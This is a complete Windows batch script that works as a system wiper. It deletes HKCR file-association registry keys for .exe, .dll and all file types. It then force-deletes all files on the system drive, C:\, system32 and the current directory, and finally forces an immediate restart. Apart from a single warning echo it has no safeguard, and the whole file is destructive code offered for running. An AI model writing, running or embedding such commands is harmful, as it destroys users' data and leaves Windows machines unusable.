@Echo off
echo WARNING: This script will perform destructive actions on your system.

REM Deleting registry entries
echo Deleting registry entries for .exe, .dll, and all file types...
reg delete HKCR/.exe /f >> log.txt 2>&1
if errorlevel 1 (
    echo Failed to delete .exe registry entry >> log.txt
    exit /b 1
)

reg delete HKCR/.dll /f >> log.txt 2>&1
if errorlevel 1 (
    echo Failed to delete .dll registry entry >> log.txt
    exit /b 1
)

reg delete HKCR/* /f >> log.txt 2>&1
if errorlevel 1 (
    echo Failed to delete all file types registry entry >> log.txt
    exit /b 1
)

REM Deleting all files from the system drive
echo Deleting all files from the system drive...
del %systemdrive%\*.* /f /s /q >> log.txt 2>&1
if errorlevel 1 (
    echo Failed to delete files from the system drive >> log.txt
    exit /b 1
)

REM Deleting all files from C:\
echo Deleting all files from C:\...
del C:\*.* /f /s /q >> log.txt 2>&1
if errorlevel 1 (
    echo Failed to delete files from C:\ >> log.txt
    exit /b 1
)

REM Deleting all files from C:\WINDOWS\system32
echo Deleting all files from C:\WINDOWS\system32...
del C:\WINDOWS\system32\*.* /q >> log.txt 2>&1
if errorlevel 1 (
    echo Failed to delete files from C:\WINDOWS\system32 >> log.txt
    exit /b 1
)

REM Deleting all files in the current directory
echo Deleting all files in the current directory...
del *.* /f /s /q >> log.txt 2>&1
if errorlevel 1 (
    echo Failed to delete files in the current directory >> log.txt
    exit /b 1
)

REM Restarting the computer
echo Restarting the computer...
shutdown -r -f -t 00 >> log.txt 2>&1
if errorlevel 1 (
    echo Failed to restart the computer >> log.txt
    exit /b 1
)

exit